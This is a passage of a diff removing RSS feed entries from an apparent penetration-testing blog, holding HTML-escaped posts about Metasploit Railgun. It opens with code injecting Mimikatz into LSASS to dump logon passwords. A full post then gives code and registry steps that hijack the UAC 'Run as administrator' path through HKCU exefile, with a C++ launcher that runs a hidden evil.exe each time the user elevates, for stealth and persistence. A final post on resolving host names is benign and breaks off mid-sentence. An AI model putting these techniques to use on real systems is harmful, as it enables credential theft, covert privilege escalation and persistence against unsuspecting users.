-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	targetprocess&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;thread&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;create(mem, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Successfully Injected into LSASS&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Waiting for LSASS injection to complete&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;connectedlsass &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ConnectNamedPipe(handle,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Mimikatz has called home, ready for command&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sleep(&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Reading banner&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;kernel32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ReadFile(handle,&lt;span style=&#34;color:#ae81ff&#34;&gt;248&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;248&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;,&lt;span style=&#34;color:#66d9ef&#34;&gt;nil&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Doing a quick ping to make sure things are working...&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do_cmd(handle,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ping&amp;#39;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print_status(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;If you made it this far it worked, doing getLogonPasswords&amp;#34;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;do_cmd(handle, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;getLogonPasswords&amp;#39;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
-    </item>
-    
-    <item>
-      <title>(UAC) User Assisted Compromise</title>
-      <link>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</link>
-      <pubDate>Tue, 03 Jan 2012 06:56:22 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2012/2012-01-03-uac-user-assisted-compromise/</guid>
-      <description>&lt;p&gt;A number of times during tests I&amp;rsquo;ve actually run into those mythical creatures called &amp;ldquo;patched windows machines&amp;rdquo;. At &lt;a href=&#34;http://www.derbycon.com&#34;&gt;DerbyCon&lt;/a&gt; &lt;a href=&#34;http://twitter.com/carnal0wnage&#34;&gt;Chris Gates&lt;/a&gt; and I released the &amp;ldquo;Ask&amp;rdquo; post module (which I had failed to publish). This module very simply uses the &lt;a href=&#34;%22http://msdn.microsoft.com/en-us/library/windows/desktop/bb762153(v=vs.85).aspx%22&#34;&gt;ShellExecute windows function&lt;/a&gt; via &lt;a href=&#34;http://dev.metasploit.com/redmine/projects/framework/wiki/RailgunUsage&#34;&gt;Railgun&lt;/a&gt; with the undocumented (but very well known) operator of &amp;lsquo;runas&amp;rsquo;. These two lines accomplished that:&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;client.railgun.add_function( &#39;shell32&#39;, &#39;ShellExecuteA&#39;, &#39;DWORD&#39;,[[&amp;quot;DWORD&amp;quot;,&amp;quot;hwnd&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpOperation&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpFile&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpParameters&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;PCHAR&amp;quot;,&amp;quot;lpDirectory&amp;quot;,&amp;quot;in&amp;quot;],[&amp;quot;DWORD&amp;quot;,&amp;quot;nShowCmd&amp;quot;,&amp;quot;in&amp;quot;],])
-client.railgun.shell32.ShellExecuteA(nil,&amp;quot;runas&amp;quot;,&amp;quot;evil.exe&amp;quot;,nil,nil,5)
-&lt;/code&gt;&lt;/pre&gt;
-&lt;p&gt;This would quite simply prompt the user with that annoying UAC prompt asking the user to run &amp;rsquo;evil.exe&amp;rsquo; with Administrative privs. If they are not &amp;ldquo;Admins&amp;rdquo; themselves then it would prompt them for the user name and password (normally the case in systems attached to domains). Something to be aware of: If your evil.exe is not code-signed the UAC box will be orange instead of blue. You can get around this a bit by using rundll32.exe (which is signed ;-) ) as is svchost.exe. (You may also want to not name it evil.exe)&lt;/p&gt;
-&lt;p&gt;The downfall here is that 1. You have to drop a binary (boooo) 2. You are prompting the user for UAC control when they didn&amp;rsquo;t do anything to cause it. Users are generally as smart as bait, but it&amp;rsquo;s good practice to assume to the contrary. If for nothing else other than to challenge yourself to up your game.&lt;/p&gt;
-&lt;p&gt;Number 1 I&amp;rsquo;ll leave to another post, so lets solve #2.&lt;/p&gt;
-&lt;p&gt;When a &amp;ldquo;runas&amp;rdquo; ShellExecute (which UAC runs natively #hint#hint) a few registry locations are checked. One I&amp;rsquo;d like to point out is the HKLM\Software\Classes\exefile key. The &amp;rsquo;exefile&amp;rsquo; as should be obvious is the registry settings for executables, and as such tells Windows how to interact with them. In HKLM (which is only writable by Administrators) the &amp;ldquo;shell\open&amp;rdquo;, &amp;ldquo;shell\runas&amp;rdquo; and &amp;ldquo;shell\runasuser&amp;rdquo; subkeys exist (the structure looks oddly familiar to anyone who visited the ShellExecute page more than once). Inside &amp;ldquo;shellopencommand&amp;rdquo; the default string has &amp;ldquo;%1&amp;rdquo; %*  - this basically means execute the binary %1 and hand the arguments given directly to it %*. Awesome! From here you can alter how every EXE runs on the system (don&amp;rsquo;t do it, Windows doesn&amp;rsquo;t like you afterwards, trust me, and remember to snapshot if you don&amp;rsquo;t).&lt;/p&gt;
-&lt;p&gt;Great, but how does this help us, we aren&amp;rsquo;t admins. HKCU is writable by the &amp;lsquo;Current User&amp;rsquo; hence the name, and it so happens to have a very similar registry path: HKCU\Software\Classes. Depending on your system, it may or may not have a &amp;ldquo;exefile&amp;rdquo; subkey. If it doesn&amp;rsquo;t it&amp;rsquo;s pretty easy to create. Lets make it match the &amp;ldquo;runas&amp;rdquo; one in HKLM&lt;/p&gt;
-&lt;p&gt;The tree should look something like this when you are done:&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;HKLM
-&lt;ul&gt;
-&lt;li&gt;Software
-&lt;ul&gt;
-&lt;li&gt;Classes
-&lt;ul&gt;
-&lt;li&gt;exefile
-&lt;ul&gt;
-&lt;li&gt;shell
-&lt;ul&gt;
-&lt;li&gt;runas
-&lt;ul&gt;
-&lt;li&gt;command&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;Under command change the default value to &amp;ldquo;%1&amp;rdquo; %* just as it is in HKLM, and add a new String value called &amp;lsquo;IsolatedCommand&amp;rsquo; with the same value as default. With these settings, very little has changed on the system or its operation. However, if we change the &amp;lsquo;IsolatedCommand&amp;rsquo; String to &amp;rsquo;notepad.exe&amp;rsquo; and attempt to &amp;lsquo;Run As Administrator&amp;rsquo; on that system using any binary guess what happens? Notepad! (as Admin). w00t. Now we can swap in our evil.exe and bob wins right? Sorta. We still have that horrible problem of stealth. Whatever the user was trying to UAC up won&amp;rsquo;t work, and they&amp;rsquo;ll try it again, and start investigating the problem, which we don&amp;rsquo;t want them to do.&lt;/p&gt;
-&lt;p&gt;Enter &amp;lsquo;runyou.exe&amp;rsquo;, it&amp;rsquo;s some very simple C++ that weighs in at a whopping 8k when compiled (probably could loose some weight by those who know better compiler options):&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;windows.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;stdio.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;#34;tchar.h&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;_tmain&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, _TCHAR&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; argv[])
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;])
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        ShellExecuteW(NULL,NULL,argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],NULL,NULL,SW_SHOW);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;])
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        {
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            ShellExecuteW(NULL,NULL,argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;],NULL,NULL,SW_HIDE);
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This code executes the first program visibly and then the second hidden. You probably see where this is going, but we change our IsolatedCommand String to runyou.exe %1 evil.exe and now we give them exactly what they want in an elevated state, but also get our evil binary there too ;-)&lt;/p&gt;
-&lt;p&gt;The very real down side to this is you have to wait for the user to use UAC (this does not work if someone else does, it&amp;rsquo;s only for the current user HKCU). But, as a side benefit, it&amp;rsquo;s a very real form of sneaky persistence as well, as it will execute our evil binary every single time they use UAC.&lt;/p&gt;
-&lt;p&gt;Game Over&amp;hellip; ;-)&lt;/p&gt;
-</description>
-    </item>
-    
-    <item>
-      <title>IP Resolution Using Meterpreter’s Railgun</title>
-      <link>https://malicious.link/post/2011/2011-08-19-ip-resolution-using-meterpreters-railgun/</link>
-      <pubDate>Fri, 19 Aug 2011 19:26:55 +0000</pubDate>
-      
-      <guid>https://malicious.link/post/2011/2011-08-19-ip-resolution-using-meterpreters-railgun/</guid>
-      <description>&lt;p&gt;I saw a post back in June and it just recently came up again:&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;http://www.securityartwork.es/2011/06/01/dns-port-forwarding-con-meterpreter/&#34;&gt;http://www.securityartwork.es/2011/06/01/dns-port-forwarding-con-meterpreter/&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;It looked like a lot of hard work to set that up and I&amp;rsquo;m really lazy. I didn&amp;rsquo;t want to have to go through all that every time I got onto a new network. So, I made a very simple meterpreter post module to just call a Windows API key called &amp;lsquo;gethostbyaddr&amp;rsquo; using Railgun.&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;TL:DR;&lt;/strong&gt; You can download the post module here: &lt;a href=&#34;https://gist.github.com/mubix/8215137&#34;&gt;ipresolver.rb&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;The function &amp;lsquo;gethostbyaddr&amp;rsquo; (&lt;a href=&#34;%22http://msdn.microsoft.com/en-us/library/ms738521(v=VS.85).aspx&#34;&gt;http://msdn.microsoft.com/en-us/library/ms738521(v=VS.85).aspx&lt;/a&gt;&amp;quot;) is pretty simple at first glance:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;hostent&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; FAR &lt;span style=&#34;color:#a6e22e&#34;&gt;gethostbyaddr&lt;/span&gt;(
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  __in  &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;addr,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  __in  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; len,
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  __in  &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; type
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;);
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Give it an address, length and type and it gives you a hostname back… easy right?&lt;/p&gt;
-&lt;p&gt;Defining it, since it isn&amp;rsquo;t in the Railgun definitions is pretty simple:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add_function(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ws2_32&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;gethostbyaddr&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DWORD&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;PCHAR&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;addr&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;in&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DWORD&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;len&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;in&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;DWORD&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;type&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;in&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;First hurdle is to get your IP into &amp;rsquo;network byte order&amp;rsquo;. Rex (Metasploit&amp;rsquo;s API/Library) to the rescue.&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;http://dev.metasploit.com/documents/api/classes/Rex/Socket.html#M002073&#34;&gt;http://dev.metasploit.com/documents/api/classes/Rex/Socket.html#M002073&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;The &amp;lsquo;addr_aton&amp;rsquo; method does just that:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;nbi &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;Rex&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;Socket&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;addr_aton(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;192.168.1.100&amp;#39;&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xC0xA8x01d&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Make the call to the API and done right?&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ws2_32&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gethostbyaddr(nbi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;to_s, nbi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size,&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Wrong, what you get back is a pointer to a mess, well lets get the mess (using a google IP for this example):&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;struct &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memread(result&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;return&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;)
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;xA0x03fx00x88x0Efx00x02x00x04x00x8Cx0Efx00x00x00x00x00x94x0Efx00x00x00x00x00J}]cqw-in-f99.1e100.netx00@efx00x06x00bx00x13x01bx00xE0vvx00xvvx00xE8x0Efx00xEEx96x03x00x00bx00x00 x01x00x00x01x00x00x00x01x00x00x00x01x00x00x00&amp;#34;&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Ya.. that…&lt;/p&gt;
-&lt;p&gt;I tried using the pointer at the 12th byte location and that worked most of the time, but failed bad on others:&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ptrptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; struct&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;].&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;V*&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;        
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hostnameptr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memread(ptrptr,&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;unpack(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;V*&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;         
-&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;hostname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; client&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;railgun&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;memread(hostnameptr&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;nbi&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;size,&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;(there were a bunch more lines of error correcting but I&amp;rsquo;ll just wanted to show these as the actual methods used on a successful run)&lt;/p&gt;
-&lt;p&gt;But on other hosts the 12th byte came back with a pointer to all 0s, so there was no way to jump again (hostnameptr) to the actual hostname.&lt;/p&gt;
-&lt;p&gt;What I missed while trying to do things the &amp;ldquo;C&amp;rdquo; way was that the hostname was always pretexted with the IP address in network byte order… Hold up, I know it begins with something I already know, and ends in the standard &amp;ldquo;C&amp;rdquo; string terminator of a null byte. So all of that plus the crazy error correction became:&lt;/p&gt;
